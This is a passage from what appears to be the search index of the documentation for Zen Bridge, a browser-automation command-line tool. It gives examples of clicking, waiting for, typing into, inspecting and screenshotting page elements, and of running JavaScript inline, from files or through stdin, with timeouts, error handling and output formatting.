right-click</code> - Right click (context menu)</li> </ul>"},{"location":"guide/element-interaction/#waiting-for-elements","title":"Waiting for Elements","text":"<p>The <code>zen wait</code> command waits for elements to appear, become visible, become hidden, or contain specific text.</p>"},{"location":"guide/element-interaction/#wait-for-element-to-exist","title":"Wait for Element to Exist","text":"<pre><code># Wait up to 30 seconds (default)\nzen wait \"button#submit\"\n\n# Custom timeout\nzen wait \".modal\" --timeout 10\n</code></pre>"},{"location":"guide/element-interaction/#wait-for-element-to-be-visible","title":"Wait for Element to be Visible","text":"<pre><code>zen wait \".modal-dialog\" --visible\n\n# With custom timeout\nzen wait \".notification\" --visible --timeout 15\n</code></pre>"},{"location":"guide/element-interaction/#wait-for-element-to-be-hidden","title":"Wait for Element to be Hidden","text":"<pre><code>zen wait \".loading-spinner\" --hidden\n\n# Wait for modal to close\nzen wait \".modal-overlay\" --hidden --timeout 20\n</code></pre>"},{"location":"guide/element-interaction/#wait-for-specific-text","title":"Wait for Specific Text","text":"<pre><code># Wait for element with specific text\nzen wait \"div.result\" --text \"Success\"\n\n# Wait for error message\nzen wait \".message\" --text \"Error\" --visible\n</code></pre>"},{"location":"guide/element-interaction/#wait-use-cases","title":"Wait Use Cases","text":"<p>Wait for page load: <pre><code>zen wait \"main.content\" --visible\n</code></pre></p> <p>Wait for AJAX content: <pre><code>zen wait \".dynamic-content\" --visible --timeout 20\n</code></pre></p> <p>Wait for form validation: <pre><code># Fill form\nzen eval \"document.querySelector('#email').value = 'test@example.com'\"\n\n# Submit\nzen click \"#submit-btn\"\n\n# Wait for success message\nzen wait \".success-message\" --visible\n</code></pre></p> <p>Wait for loading to finish: <pre><code># Click action that shows spinner\nzen click \".load-more\"\n\n# Wait for spinner to disappear\nzen wait \".spinner\" --hidden\n</code></pre></p> <p>Timeout Default</p> <p>Default timeout is 30 seconds. Adjust with <code>--timeout</code> flag.</p>"},{"location":"guide/element-interaction/#sending-keyboard-input","title":"Sending Keyboard Input","text":"<p>The <code>zen send</code> command types text character by character, simulating keyboard input.</p>"},{"location":"guide/element-interaction/#basic-text-input","title":"Basic Text Input","text":"<pre><code>zen send \"Hello World\"\n</code></pre> <p>Types into the currently focused element.</p>"},{"location":"guide/element-interaction/#send-to-specific-element","title":"Send to Specific Element","text":"<pre><code># Type into email input\nzen send \"test@example.com\" --selector \"input[type=email]\"\n\n# Type into search box\nzen send \"query text\" --selector \"input[name=search]\"\n\n# Type into textarea\nzen send \"Multi-line text here\" --selector \"textarea#message\"\n</code></pre>"},{"location":"guide/element-interaction/#form-filling-examples","title":"Form Filling Examples","text":"<p>Login form: <pre><code>zen send \"user@example.com\" --selector \"#email\"\nzen send \"password123\" --selector \"#password\"\nzen click \"#login-btn\"\n</code></pre></p> <p>Search form: <pre><code>zen send \"Zen Bridge documentation\" --selector \"input[name=q]\"\nzen click \"button[type=submit]\"\n</code></pre></p> <p>Comment form: <pre><code>zen send \"Great article!\" --selector \"textarea#comment\"\nzen send \"John Doe\" --selector \"input#name\"\nzen click \"button#post-comment\"\n</code></pre></p>"},{"location":"guide/element-interaction/#typing-speed","title":"Typing Speed","text":"<p>The <code>send</code> command types at a realistic speed (character by character). For instant value setting, use <code>zen eval</code>:</p> <pre><code># Instant value (no events)\nzen eval \"document.querySelector('#email').value = 'test@example.com'\"\n\n# Typed input (fires input events)\nzen send \"test@example.com\" --selector \"#email\"\n</code></pre> <p>Input Events</p> <p><code>zen send</code> fires proper keyboard events, which may trigger validation, autocomplete, and other event listeners.</p>"},{"location":"guide/element-interaction/#inspecting-elements","title":"Inspecting Elements","text":""},{"location":"guide/element-interaction/#inspect-element","title":"Inspect Element","text":"<p>Select and store an element for inspection:</p> <pre><code>zen inspect \"h1\"\n</code></pre> <p>Output: <pre><code>Element: H1\nText: Welcome to Example\nClasses: page-title, main-heading\nID: title\n</code></pre></p>"},{"location":"guide/element-interaction/#inspect-by-selector","title":"Inspect by Selector","text":"<pre><code># By ID\nzen inspect \"#header\"\n\n# By class\nzen inspect \".main-content\"\n\n# By complex selector\nzen inspect \"nav &gt; ul &gt; li:first-child &gt; a\"\n\n# By attribute\nzen inspect \"[data-id='123']\"\n</code></pre>"},{"location":"guide/element-interaction/#get-inspected-element-details","title":"Get Inspected Element Details","text":"<p>After inspecting an element, get detailed information:</p> <pre><code>zen inspected\n</code></pre> <p>Output: <pre><code>{\n  \"tagName\": \"H1\",\n  \"textContent\": \"Welcome to Example\",\n  \"id\": \"title\",\n  \"className\": \"page-title main-heading\",\n  \"attributes\": {\n    \"id\": \"title\",\n    \"class\": \"page-title main-heading\",\n    \"data-section\": \"hero\"\n  },\n  \"boundingBox\": {\n    \"x\": 100,\n    \"y\": 50,\n    \"width\": 600,\n    \"height\": 80\n  }\n}\n</code></pre></p>"},{"location":"guide/element-interaction/#using-devtools-integration","title":"Using DevTools Integration","text":"<p>You can also store the currently selected element in DevTools:</p> <ol> <li>Open DevTools (F12)</li> <li>Select an element (inspect tool or click in Elements panel)</li> <li>In console, run: <code>zenStore($0)</code></li> <li>Then use: <code>zen inspected</code></li> </ol> <p>Workflow</p> <p>Use <code>zen inspect</code> to find elements programmatically, or use DevTools + <code>zenStore($0)</code> for visual selection.</p>"},{"location":"guide/element-interaction/#highlighting-elements","title":"Highlighting Elements","text":"<p>Visually highlight elements on the page with colored outlines.</p>"},{"location":"guide/element-interaction/#basic-highlight","title":"Basic Highlight","text":"<pre><code>zen highlight \"h1, h2\"\n</code></pre> <p>Highlights all matching elements with a red dashed outline.</p>"},{"location":"guide/element-interaction/#custom-color","title":"Custom Color","text":"<pre><code>zen highlight \"a\" --color blue\nzen highlight \".error\" --color red\nzen highlight \".success\" --color green\nzen highlight \".warning\" --color orange\n</code></pre>"},{"location":"guide/element-interaction/#clear-highlights","title":"Clear Highlights","text":"<pre><code>zen highlight --clear\n</code></pre> <p>Removes all highlights from the page.</p>"},{"location":"guide/element-interaction/#highlight-use-cases","title":"Highlight Use Cases","text":"<p>Debugging layout: <pre><code>zen highlight \"div\"\n</code></pre></p> <p>Find all links: <pre><code>zen highlight \"a\" --color blue\n</code></pre></p> <p>Highlight errors: <pre><code>zen highlight \".error-message\" --color red\n</code></pre></p> <p>Accessibility audit: <pre><code># Highlight images without alt text\nzen eval \"\n  document.querySelectorAll('img:not([alt])').forEach(img =&gt; {\n    img.style.outline = '3px solid red';\n  });\n  'Highlighted images without alt text';\n\"\n</code></pre></p>"},{"location":"guide/element-interaction/#screenshots","title":"Screenshots","text":"<p>Take screenshots of specific elements.</p>"},{"location":"guide/element-interaction/#screenshot-element","title":"Screenshot Element","text":"<pre><code>zen screenshot --selector \"h1\" --output screenshot.png\n</code></pre>"},{"location":"guide/element-interaction/#screenshot-examples","title":"Screenshot Examples","text":"<pre><code># Screenshot by selector\nzen screenshot --selector \"#header\" --output header.png\n\n# Screenshot with auto-generated filename\nzen screenshot --selector \".hero-section\"\n\n# Screenshot of inspected element\nzen inspect \"h1\"\nzen screenshot --selector \"$0\" --output title.png\n</code></pre>"},{"location":"guide/element-interaction/#screenshot-use-cases","title":"Screenshot Use Cases","text":"<p>Visual regression testing: <pre><code>zen screenshot --selector \".hero\" --output hero-$(date +%Y%m%d).png\n</code></pre></p> <p>Documentation: <pre><code>zen screenshot --selector \".component-example\" --output docs/component.png\n</code></pre></p> <p>Bug reports: <pre><code>zen screenshot --selector \".error-dialog\" --output bug-screenshot.png\n</code></pre></p> <p>Screenshot Format</p> <p>Screenshots are saved as PNG files. The <code>--output</code> flag is optional; a timestamp-based filename is generated if omitted.</p>"},{"location":"guide/element-interaction/#css-selectors-explained","title":"CSS Selectors Explained","text":"<p>Zen Bridge uses standard CSS selectors. Here's a quick reference:</p>"},{"location":"guide/element-interaction/#basic-selectors","title":"Basic Selectors","text":"Selector Example Description Element <code>div</code> Select by tag name Class <code>.button</code> Select by class ID <code>#submit</code> Select by ID Attribute <code>[type=\"text\"]</code> Select by attribute Universal <code>*</code> Select all elements"},{"location":"guide/element-interaction/#combinators","title":"Combinators","text":"Combinator Example Description Descendant <code>div p</code> All <code>&lt;p&gt;</code> inside <code>&lt;div&gt;</code> Child <code>div &gt; p</code> Direct children only Adjacent sibling <code>h1 + p</code> <code>&lt;p&gt;</code> immediately after <code>&lt;h1&gt;</code> General sibling <code>h1 ~ p</code> All <code>&lt;p&gt;</code> siblings after <code>&lt;h1&gt;</code>"},{"location":"guide/element-interaction/#pseudo-classes","title":"Pseudo-classes","text":"Pseudo-class Example Description <code>:first-child</code> <code>li:first-child</code> First child element <code>:last-child</code> <code>li:last-child</code> Last child element <code>:nth-child(n)</code> <code>li:nth-child(2)</code> Nth child element <code>:not(selector)</code> <code>:not(.active)</code> Elements not matching <code>:hover</code> <code>a:hover</code> Hovered elements"},{"location":"guide/element-interaction/#complex-selectors","title":"Complex Selectors","text":"<pre><code># Multiple classes\nzen click \".button.primary\"\n\n# Attribute with value\nzen click \"[data-action='submit']\"\n\n# Attribute contains\nzen click \"[class*='modal']\"\n\n# Attribute starts with\nzen click \"[id^='btn-']\"\n\n# Attribute ends with\nzen click \"[href$='.pdf']\"\n\n# Multiple selectors\nzen highlight \"h1, h2, h3\"\n\n# Complex combination\nzen click \"nav &gt; ul &gt; li:first-child &gt; a.active\"\n</code></pre>"},{"location":"guide/element-interaction/#interactive-examples","title":"Interactive Examples","text":""},{"location":"guide/element-interaction/#example-1-form-automation","title":"Example 1: Form Automation","text":"<pre><code># Fill login form\nzen send \"user@example.com\" --selector \"#email\"\nzen send \"password123\" --selector \"#password\"\nzen click \"#remember-me\"\nzen click \"#login-btn\"\n\n# Wait for redirect or error\nzen wait \".dashboard, .error-message\" --visible --timeout 10\n</code></pre>"},{"location":"guide/element-interaction/#example-2-modal-interaction","title":"Example 2: Modal Interaction","text":"<pre><code># Open modal\nzen click \"#open-modal\"\n\n# Wait for modal to appear\nzen wait \".modal-dialog\" --visible\n\n# Interact with modal\nzen send \"Test message\" --selector \".modal textarea\"\nzen click \".modal button.confirm\"\n\n# Wait for modal to close\nzen wait \".modal-dialog\" --hidden\n</code></pre>"},{"location":"guide/element-interaction/#example-3-dynamic-content","title":"Example 3: Dynamic Content","text":"<pre><code># Click \"Load More\" button\nzen click \".load-more\"\n\n# Wait for spinner to disappear\nzen wait \".loading-spinner\" --hidden\n\n# Count new items\nzen eval \"document.querySelectorAll('.item').length\"\n</code></pre>"},{"location":"guide/element-interaction/#example-4-multi-step-flow","title":"Example 4: Multi-step Flow","text":"<pre><code># Step 1: Fill first form\nzen send \"John\" --selector \"#first-name\"\nzen send \"Doe\" --selector \"#last-name\"\nzen click \"#next-btn\"\n\n# Step 2: Wait and fill second form\nzen wait \"#email\" --visible\nzen send \"john@example.com\" --selector \"#email\"\nzen send \"1234567890\" --selector \"#phone\"\nzen click \"#submit-btn\"\n\n# Step 3: Wait for confirmation\nzen wait \".success-message\" --visible --text \"Success\"\n</code></pre>"},{"location":"guide/element-interaction/#example-5-visual-testing","title":"Example 5: Visual Testing","text":"<pre><code># Highlight all buttons\nzen highlight \"button\" --color blue\n\n# Inspect specific button\nzen inspect \"button.primary\"\n\n# Take screenshot\nzen screenshot --selector \"button.primary\" --output button.png\n\n# Clear highlights\nzen highlight --clear\n</code></pre>"},{"location":"guide/element-interaction/#advanced-patterns","title":"Advanced Patterns","text":""},{"location":"guide/element-interaction/#conditional-clicking","title":"Conditional Clicking","text":"<pre><code># Click only if element exists\nzen eval \"\n  const button = document.querySelector('#optional-btn');\n  if (button) {\n    button.click();\n    return 'Clicked';\n  }\n  return 'Button not found';\n\"\n</code></pre>"},{"location":"guide/element-interaction/#click-all-matching-elements","title":"Click All Matching Elements","text":"<pre><code># Click all checkboxes\nzen eval \"\n  document.querySelectorAll('input[type=checkbox]').forEach(cb =&gt; cb.click());\n  return 'Clicked all checkboxes';\n\"\n</code></pre>"},{"location":"guide/element-interaction/#wait-with-polling","title":"Wait with Polling","text":"<pre><code>zen eval \"\n  async function waitForElement(selector, timeout = 30000) {\n    const start = Date.now();\n    while (Date.now() - start &lt; timeout) {\n      const element = document.querySelector(selector);\n      if (element) return element;\n      await new Promise(resolve =&gt; setTimeout(resolve, 100));\n    }\n    throw new Error('Timeout');\n  }\n\n  const element = await waitForElement('.dynamic-content');\n  return element.textContent;\n\"\n</code></pre>"},{"location":"guide/element-interaction/#hover-simulation","title":"Hover Simulation","text":"<pre><code>zen eval \"\n  const element = document.querySelector('.menu-item');\n  const event = new MouseEvent('mouseover', {\n    bubbles: true,\n    cancelable: true,\n    view: window\n  });\n  element.dispatchEvent(event);\n  return 'Hovered over element';\n\"\n</code></pre>"},{"location":"guide/element-interaction/#focus-and-blur","title":"Focus and Blur","text":"<pre><code># Focus element\nzen eval \"document.querySelector('#email').focus()\"\n\n# Blur element\nzen eval \"document.querySelector('#email').blur()\"\n\n# Type after focusing\nzen eval \"document.querySelector('#email').focus()\"\nzen send \"test@example.com\" --selector \"#email\"\n</code></pre>"},{"location":"guide/element-interaction/#troubleshooting","title":"Troubleshooting","text":""},{"location":"guide/element-interaction/#element-not-found","title":"Element Not Found","text":"<p>Error: <pre><code>Error: Element not found: .missing-selector\n</code></pre></p> <p>Solutions: 1. Verify selector is correct 2. Wait for element to load: <code>zen wait \".selector\" --visible</code> 3. Check if element is in iframe (not supported directly) 4. Use DevTools to test selector</p>"},{"location":"guide/element-interaction/#click-not-working","title":"Click Not Working","text":"<p>Possible causes: - Element is not visible - Element is disabled - JavaScript event handler expecting different event - Element is covered by another element</p> <p>Solutions: <pre><code># Check if visible\nzen eval \"document.querySelector('.btn')?.offsetParent !== null\"\n\n# Check if disabled\nzen eval \"document.querySelector('.btn')?.disabled\"\n\n# Force click with JavaScript\nzen eval \"document.querySelector('.btn').click()\"\n\n# Dispatch click event\nzen eval \"document.querySelector('.btn').dispatchEvent(new MouseEvent('click', {bubbles: true}))\"\n</code></pre></p>"},{"location":"guide/element-interaction/#element-changes-after-action","title":"Element Changes After Action","text":"<p>Some elements are replaced after interaction (e.g., React re-renders). Re-select after action:</p> <pre><code># Wrong - selector may be stale\nzen click \".btn\"\nzen eval \"document.querySelector('.btn').textContent\"\n\n# Correct - re-select after action\nzen click \".btn\"\nzen wait \".success-message\" --visible\nzen eval \"document.querySelector('.success-message').textContent\"\n</code></pre>"},{"location":"guide/element-interaction/#best-practices","title":"Best Practices","text":""},{"location":"guide/element-interaction/#1-use-specific-selectors","title":"1. Use Specific Selectors","text":"<pre><code># Good - specific\nzen click \"#submit-btn\"\nzen click \"[data-testid='submit-button']\"\n\n# Avoid - too generic\nzen click \"button\"\nzen click \".btn\"\n</code></pre>"},{"location":"guide/element-interaction/#2-wait-before-interacting","title":"2. Wait Before Interacting","text":"<pre><code># Good - wait for element\nzen wait \"#modal\" --visible\nzen click \"#modal .confirm-btn\"\n\n# Risky - element may not exist yet\nzen click \"#modal .confirm-btn\"\n</code></pre>"},{"location":"guide/element-interaction/#3-handle-errors-gracefully","title":"3. Handle Errors Gracefully","text":"<pre><code># Use optional chaining\nzen eval \"document.querySelector('.maybe-missing')?.click() ?? 'Element not found'\"\n</code></pre>"},{"location":"guide/element-interaction/#4-verify-actions","title":"4. Verify Actions","text":"<pre><code># Click and verify\nzen click \"#submit-btn\"\nzen wait \".success-message\" --visible --text \"Saved\"\n</code></pre>"},{"location":"guide/element-interaction/#next-steps","title":"Next Steps","text":"<ul> <li>Data Extraction - Extract structured data from pages</li> <li>Control Mode - Keyboard-only navigation</li> <li>Advanced Usage - Complex patterns and scripting</li> </ul>"},{"location":"guide/element-interaction/#quick-reference","title":"Quick Reference","text":"Command Purpose Example <code>zen click \"selector\"</code> Click element <code>zen click \"#submit\"</code> <code>zen double-click \"selector\"</code> Double-click <code>zen double-click \".file\"</code> <code>zen right-click \"selector\"</code> Right-click <code>zen right-click \".context\"</code> <code>zen wait \"selector\"</code> Wait for element <code>zen wait \".modal\" --visible</code> <code>zen send \"text\"</code> Type text <code>zen send \"hello\" --selector \"#input\"</code> <code>zen inspect \"selector\"</code> Inspect element <code>zen inspect \"h1\"</code> <code>zen inspected</code> Get inspected details <code>zen inspected</code> <code>zen highlight \"selector\"</code> Highlight elements <code>zen highlight \"a\" --color blue</code> <code>zen screenshot --selector</code> Screenshot element <code>zen screenshot --selector \"h1\"</code>"},{"location":"guide/javascript-execution/","title":"JavaScript Execution","text":"<p>Master JavaScript execution in Zen Bridge. Learn inline code execution, file execution, stdin piping, timeout handling, error handling, output formatting, and advanced patterns.</p>"},{"location":"guide/javascript-execution/#execution-methods","title":"Execution Methods","text":"<p>Zen Bridge offers three ways to execute JavaScript code in your browser.</p>"},{"location":"guide/javascript-execution/#1-inline-code-execution","title":"1. Inline Code Execution","text":"<p>Execute code directly from the command line:</p> <pre><code>zen eval \"document.title\"\n</code></pre> <p>Best for: - Quick one-liners - Testing expressions - Shell scripts with short code snippets</p>"},{"location":"guide/javascript-execution/#2-file-execution","title":"2. File Execution","text":"<p>Execute code from JavaScript files:</p> <pre><code>zen eval --file script.js\n# or\nzen exec script.js\n</code></pre> <p>Best for: - Complex scripts - Reusable code - Version-controlled automation</p>"},{"location":"guide/javascript-execution/#3-stdin-piping","title":"3. stdin Piping","text":"<p>Pipe code from stdin:</p> <pre><code>cat script.js | zen eval\necho \"document.title\" | zen eval\n</code></pre> <p>Best for: - Generated code - Dynamic scripts - Shell pipelines</p>"},{"location":"guide/javascript-execution/#inline-code-execution","title":"Inline Code Execution","text":""},{"location":"guide/javascript-execution/#simple-expressions","title":"Simple Expressions","text":"<pre><code># Get page title\nzen eval \"document.title\"\n\n# Get URL\nzen eval \"window.location.href\"\n\n# Count elements\nzen eval \"document.querySelectorAll('a').length\"\n\n# Check if element exists\nzen eval \"document.querySelector('.modal') !== null\"\n</code></pre>"},{"location":"guide/javascript-execution/#complex-expressions","title":"Complex Expressions","text":"<pre><code># Array operations\nzen eval \"Array.from(document.links).map(a =&gt; a.href)\"\n\n# Object literals (wrap in parentheses)\nzen eval \"({title: document.title, url: location.href})\"\n\n# Filter and map\nzen eval \"Array.from(document.querySelectorAll('img')).filter(img =&gt; img.alt).map(img =&gt; img.src)\"\n\n# Reduce\nzen eval \"Array.from(document.links).reduce((acc, link) =&gt; acc + link.textContent.length, 0)\"\n</code></pre>"},{"location":"guide/javascript-execution/#multi-line-code","title":"Multi-line Code","text":"<p>Use newlines and proper JavaScript syntax:</p> <pre><code>zen eval \"\n  const products = document.querySelectorAll('.product');\n  const data = Array.from(products).map(p =&gt; ({\n    name: p.querySelector('.name').textContent,\n    price: p.querySelector('.price').textContent\n  }));\n  return data;\n\"\n</code></pre> <p>Multi-line Tips</p> <ul> <li>Separate statements with semicolons</li> <li>Use <code>return</code> for the final value</li> <li>Proper indentation makes code readable</li> </ul>"},{"location":"guide/javascript-execution/#handling-quotes","title":"Handling Quotes","text":"<p>Shell quoting can be tricky. Here are the rules:</p> <pre><code># Double quotes - escape inner double quotes\nzen eval \"document.querySelector(\\\"h1\\\").textContent\"\n\n# Single quotes in double quotes - no escaping needed\nzen eval \"document.querySelector('h1').textContent\"\n\n# Backticks for template literals - use single quotes outside\nzen eval 'document.querySelector(\"h1\").textContent = `Hello ${name}`'\n\n# Heredoc for complex quoting\nzen eval &lt;&lt;'EOF'\nconst selector = 'div[data-value=\"complex\"]';\nconst element = document.querySelector(selector);\nreturn element?.textContent;\nEOF\n</code></pre>"},{"location":"guide/javascript-execution/#file-execution","title":"File Execution","text":""},{"location":"guide/javascript-execution/#basic-file-execution","title":"Basic File Execution","text":"<p>script.js: <pre><code>// Extract all links\nconst links = Array.from(document.querySelectorAll('a'));\nreturn links.map(link =&gt; ({\n  text: link.textContent.trim(),\n  href: link.href,\n  external: link.hostname !== location.hostname\n}));\n</code></pre></p> <p>Execute: <pre><code>zen exec script.js\n# or\nzen eval --file script.js\n</code></pre></p>"},{"location":"guide/javascript-execution/#file-with-modules","title":"File with Modules","text":"<p>Modern JavaScript syntax is supported:</p> <p>extract-data.js: <pre><code>// Extract product data with validation\nconst products = Array.from(document.querySelectorAll('.product'));\n\nfunction extractProduct(element) {\n  const name = element.querySelector('.product-name')?.textContent?.trim();\n  const price = element.querySelector('.product-price')?.textContent?.trim();\n  const image = element.querySelector('.product-image')?.src;\n\n  // Validate required fields\n  if (!name || !price) return null;\n\n  return { name, price, image };\n}\n\nconst data = products.map(extractProduct).filter(Boolean);\n\nreturn {\n  count: data.length,\n  products: data,\n  extracted: new Date().toISOString()\n};\n</code></pre></p>"},{"location":"guide/javascript-execution/#built-in-scripts","title":"Built-in Scripts","text":"<p>Zen Bridge includes several ready-to-use scripts in the <code>zen/scripts/</code> directory:</p> <pre><code># Extract all images\nzen exec zen/scripts/extract_images.js\n\n# Extract table data\nzen exec zen/scripts/extract_table.js\n\n# Get SEO metadata\nzen exec zen/scripts/extract_metadata.js\n\n# Performance metrics\nzen exec zen/scripts/performance_metrics.js\n\n# Inject jQuery\nzen exec zen/scripts/inject_jquery.js\n\n# Highlight elements\nzen exec zen/scripts/highlight_selector.js\n</code></pre>"},{"location":"guide/javascript-execution/#creating-your-own-scripts","title":"Creating Your Own Scripts","text":"<p>1. Create a script directory: <pre><code>mkdir -p ~/zen-scripts\n</code></pre></p> <p>2. Write your script: <pre><code>// ~/zen-scripts/extract-prices.js\nconst prices = Array.from(document.querySelectorAll('.price'));\nreturn prices.map(p =&gt; ({\n  text: p.textContent,\n  value: parseFloat(p.textContent.replace(/[^0-9.]/g, ''))\n}));\n</code></pre></p> <p>3. Execute: <pre><code>zen exec ~/zen-scripts/extract-prices.js --format json\n</code></pre></p>"},{"location":"guide/javascript-execution/#stdin-piping","title":"stdin Piping","text":""},{"location":"guide/javascript-execution/#pipe-from-files","title":"Pipe from Files","text":"<pre><code>cat script.js | zen eval\n</code></pre>"},{"location":"guide/javascript-execution/#pipe-from-echo","title":"Pipe from echo","text":"<pre><code>echo \"document.title\" | zen eval\n</code></pre>"},{"location":"guide/javascript-execution/#generate-code-dynamically","title":"Generate Code Dynamically","text":"<pre><code># Generate selector from variable\nSELECTOR=\".product\"\necho \"document.querySelectorAll('$SELECTOR').length\" | zen eval\n\n# Generate complex code\ncat &lt;&lt;EOF | zen eval\nconst selector = '$SELECTOR';\nconst elements = document.querySelectorAll(selector);\nreturn Array.from(elements).length;\nEOF\n</code></pre>"},{"location":"guide/javascript-execution/#pipe-chains","title":"Pipe Chains","text":"<pre><code># Extract, filter, execute\ngrep -v \"^//\" script.js | zen eval\n\n# Combine multiple commands\necho \"document.links.length\" | zen eval | awk '{print \"Found \" $1 \" links\"}'\n</code></pre>"},{"location":"guide/javascript-execution/#timeout-handling","title":"Timeout Handling","text":""},{"location":"guide/javascript-execution/#default-timeout","title":"Default Timeout","text":"<p>Commands timeout after 10 seconds by default:</p> <pre><code>zen eval \"document.title\"  # 10 second timeout\n</code></pre>"},{"location":"guide/javascript-execution/#custom-timeout","title":"Custom Timeout","text":"<p>Adjust for slow operations:</p> <pre><code># 30 second timeout\nzen eval \"await fetch('/api/data').then(r =&gt; r.json())\" --timeout 30\n\n# 5 second timeout (strict)\nzen eval \"document.title\" --timeout 5\n\n# 60 second timeout (very slow operations)\nzen eval \"await heavyComputation()\" --timeout 60\n</code></pre>"},{"location":"guide/javascript-execution/#timeout-examples","title":"Timeout Examples","text":"<p>Long-running API call: <pre><code>zen eval \"\n  const response = await fetch('/api/large-dataset');\n  const data = await response.json();\n  return data.items.length;\n\" --timeout 30\n</code></pre></p> <p>Wait for lazy-loaded content: <pre><code>zen eval \"\n  // Scroll to load content\n  for (let i = 0; i &lt; 10; i++) {\n    window.scrollTo(0, document.body.scrollHeight);\n    await new Promise(resolve =&gt; setTimeout(resolve, 1000));\n  }\n  return document.querySelectorAll('.lazy-item').length;\n\" --timeout 30\n</code></pre></p>"},{"location":"guide/javascript-execution/#timeout-errors","title":"Timeout Errors","text":"<p>When a timeout occurs:</p> <pre><code>Error: Request timed out after 10 seconds\n</code></pre> <p>Solutions: 1. Increase timeout with <code>--timeout</code> 2. Optimize your JavaScript code 3. Break into smaller operations 4. Check for infinite loops</p>"},{"location":"guide/javascript-execution/#error-handling","title":"Error Handling","text":""},{"location":"guide/javascript-execution/#javascript-errors","title":"JavaScript Errors","text":"<p>Runtime errors are caught and displayed:</p> <pre><code>zen eval \"document.querySelector('.missing').click()\"\n</code></pre> <p>Output: <pre><code>TypeError: Cannot read property 'click' of null\n  at &lt;eval&gt;:1:42\n</code></pre></p>"},{"location":"guide/javascript-execution/#syntax-errors","title":"Syntax Errors","text":"<p>Invalid JavaScript is caught:</p> <pre><code>zen eval \"document..title\"\n</code></pre> <p>Output: <pre><code>SyntaxError: Unexpected token '.'\n</code></pre></p>"},{"location":"guide/javascript-execution/#handling-errors-in-your-code","title":"Handling Errors in Your Code","text":"<p>Use try-catch for graceful error handling:</p> <pre><code>zen eval \"\n  try {\n    const element = document.querySelector('.maybe-exists');\n    return element.textContent;\n  } catch (error) {\n    return null;\n  }\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#defensive-coding","title":"Defensive Coding","text":"<p>Use optional chaining and nullish coalescing:</p> <pre><code># Optional chaining\nzen eval \"document.querySelector('.modal')?.textContent\"\n\n# Nullish coalescing\nzen eval \"document.querySelector('.price')?.textContent ?? 'N/A'\"\n\n# Combined\nzen eval \"document.querySelector('.product')?.querySelector('.price')?.textContent ?? 'No price'\"\n</code></pre>"},{"location":"guide/javascript-execution/#validation","title":"Validation","text":"<p>Validate before operating:</p> <pre><code>zen eval \"\n  const element = document.querySelector('.submit-btn');\n  if (!element) {\n    return { error: 'Button not found' };\n  }\n  element.click();\n  return { success: true };\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#output-formatting","title":"Output Formatting","text":""},{"location":"guide/javascript-execution/#format-options","title":"Format Options","text":"<p>Control output format with the <code>--format</code> flag:</p> Format Description Use Case <code>auto</code> Smart formatting (default) General use <code>json</code> Valid JSON Scripting, piping to <code>jq</code> <code>raw</code> Plain text Shell variables"},{"location":"guide/javascript-execution/#auto-format-default","title":"Auto Format (Default)","text":"<p>Intelligently formats output:</p> <pre><code>zen eval \"document.title\"\n# Output: Example Domain (plain text)\n\nzen eval \"({title: document.title, url: location.href})\"\n# Output: Pretty-printed JSON\n</code></pre>"},{"location":"guide/javascript-execution/#json-format","title":"JSON Format","text":"<p>Always outputs valid JSON:</p> <pre><code>zen eval \"document.title\" --format json\n# Output: \"Example Domain\"\n\nzen eval \"({title: document.title, links: document.links.length})\" --format json\n# Output: {\"title\":\"Example Domain\",\"links\":15}\n</code></pre> <p>Perfect for <code>jq</code>: <pre><code>zen eval \"({title: document.title, url: location.href})\" --format json | jq '.title'\n# Output: \"Example Domain\"\n</code></pre></p>"},{"location":"guide/javascript-execution/#raw-format","title":"Raw Format","text":"<p>No formatting - just the value:</p> <pre><code>zen eval \"document.title\" --format raw\n# Output: Example Domain\n\nzen eval \"document.links.length\" --format raw\n# Output: 15\n</code></pre> <p>Perfect for shell variables: <pre><code>TITLE=$(zen eval \"document.title\" --format raw)\nCOUNT=$(zen eval \"document.links.length\" --format raw)\necho \"$COUNT links on $TITLE\"\n</code></pre></p>"},{"location":"guide/javascript-execution/#metadata-flags","title":"Metadata Flags","text":"<p>Add context to output:</p> <pre><code># Add URL\nzen eval \"document.title\" --url\n\n# Add title\nzen eval \"document.links.length\" --title\n\n# Add both\nzen eval \"document.links.length\" --url --title\n</code></pre> <p>Output: <pre><code>URL: https://example.com\nTitle: Example Domain\n\n15\n</code></pre></p>"},{"location":"guide/javascript-execution/#advanced-patterns","title":"Advanced Patterns","text":""},{"location":"guide/javascript-execution/#asyncawait","title":"Async/Await","text":"<p>Full support for promises and async/await:</p> <pre><code># Fetch API\nzen eval \"await fetch('/api/data').then(r =&gt; r.json())\"\n\n# Multiple awaits\nzen eval \"\n  const response = await fetch('/api/users');\n  const users = await response.json();\n  return users.length;\n\"\n\n# Promise.all\nzen eval \"\n  const promises = Array.from({length: 5}, (_, i) =&gt;\n    fetch(\\`/api/item/\\${i}\\`).then(r =&gt; r.json())\n  );\n  return await Promise.all(promises);\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#working-with-arrays","title":"Working with Arrays","text":"<pre><code># Map\nzen eval \"Array.from(document.querySelectorAll('a')).map(a =&gt; a.href)\"\n\n# Filter\nzen eval \"Array.from(document.links).filter(a =&gt; a.hostname === location.hostname)\"\n\n# Reduce\nzen eval \"Array.from(document.images).reduce((sum, img) =&gt; sum + img.naturalWidth, 0)\"\n\n# Find\nzen eval \"Array.from(document.links).find(a =&gt; a.textContent.includes('Contact'))\"\n\n# Some/Every\nzen eval \"Array.from(document.images).every(img =&gt; img.alt)\"\n</code></pre>"},{"location":"guide/javascript-execution/#working-with-objects","title":"Working with Objects","text":"<pre><code># Object.keys\nzen eval \"Object.keys(window)\"\n\n# Object.entries\nzen eval \"Object.entries(localStorage).map(([k,v]) =&gt; ({key: k, value: v}))\"\n\n# Destructuring\nzen eval \"\n  const {title, URL: url} = document;\n  return {title, url};\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#dom-traversal","title":"DOM Traversal","text":"<pre><code># Parent\nzen eval \"document.querySelector('.child').parentElement.tagName\"\n\n# Children\nzen eval \"Array.from(document.body.children).map(el =&gt; el.tagName)\"\n\n# Siblings\nzen eval \"document.querySelector('h1').nextElementSibling?.tagName\"\n\n# Closest\nzen eval \"document.querySelector('.nested').closest('.container')?.className\"\n</code></pre>"},{"location":"guide/javascript-execution/#performance-optimization","title":"Performance Optimization","text":"<p>Cache selectors: <pre><code>zen eval \"\n  const products = document.querySelectorAll('.product');\n  return Array.from(products).map(p =&gt; {\n    // Reuse 'p' instead of querying again\n    return {\n      name: p.querySelector('.name').textContent,\n      